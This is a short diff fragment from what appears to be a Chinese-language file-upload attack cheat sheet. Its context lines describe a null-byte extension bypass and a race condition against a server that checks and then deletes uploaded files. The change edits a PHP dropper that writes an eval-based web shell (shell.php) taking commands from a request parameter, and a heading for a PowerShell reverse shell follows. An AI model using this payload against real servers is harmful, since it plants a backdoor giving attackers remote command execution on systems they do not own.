@@ -11,7 +11,7 @@ filename.php%00.pdf
 服务器对文件进行检测，如果不符合则删除文件，这其中需要一些时间，我们可以利用这个时间差进行上传木马，要求服务器接收到文件不会重命名。
 我们将上传的文件写为：
 ```
-<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>
+<?php fputs(fopen('shell.php','w'),'<?php eval($_GET[cmd])?>');?>
 
 ```
 ### Powershell reverse shell
